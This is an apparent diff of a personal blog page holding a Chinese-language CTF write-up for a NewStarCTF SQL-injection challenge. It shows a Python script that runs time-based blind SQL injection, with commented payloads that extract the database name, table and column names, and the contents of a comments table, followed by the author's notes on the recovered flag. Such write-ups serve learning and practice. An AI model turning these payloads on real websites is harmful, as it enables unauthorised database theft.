 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr(database(),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #爆库</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_comments&#x27;)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #注意引号</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(text))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(reverse(group_concat(text)))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #同样的倒置输出</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        times = time.time() <span class="comment">#发送访问请求前的时间</span></span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time() <span class="comment">#发送访问后的时间</span></span><br><span class="line">        keep = timee - times <span class="comment">#当然是大-小</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment">#防止429</span></span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">2</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) //<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">	<span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Results:&quot;</span>,res) <span class="comment">#输出最终结果</span></span><br><span class="line"><span class="comment">#print(&quot;Final Results:&quot;,res[::-1]) #如果选择倒序，选这个</span></span><br></pre></td></tr></table></figure>
-
-
-
 <p>然后就等吧… 啊呜，好困呜呜</p>
 <p>睡一觉就把表跑完了，放心吧</p>
 <p>记得renew 靶机</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/25.png" class title="一包烟，一杯酒，时间盲注跑一天">
-
 <p>睡了一觉，终于跑完了（我忘记开最后那个倒序重整了，所以flag是倒着的）</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/26.png" class title="一包烟，一杯酒，时间盲注跑一天">
-
 <p>flag{Ju2t_let_me_sleep_f0r_a_while}</p>
 <hr>
 <p>结束辣，好题，但是结束了才会做呜呜呜</p>
 <p>看我摆烂的结果如何？</p>
-<p>题目来自：buuoj.cn  &#x2F;&#x2F;NewStarsCTF</p>
+<p>题目来自：<a target="_blank" rel="noopener" href="http://buuoj.cn">buuoj.cn</a>  //NewStarsCTF</p>
 <p>图片来自：截图</p>
 <p>侵删qwq</p>
 </div>
@@ -626,7 +592,7 @@
     <div class="photo-background"></div>
     <div class="photo-wrapper clearfix">
         <div class="photo-wrapper-tip text-center">
-            <img class="about-photo" src="/images/luo.webp" loading="lazy" decoding="auto" />
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
         </div>
     </div>
     <div class="textwidget">
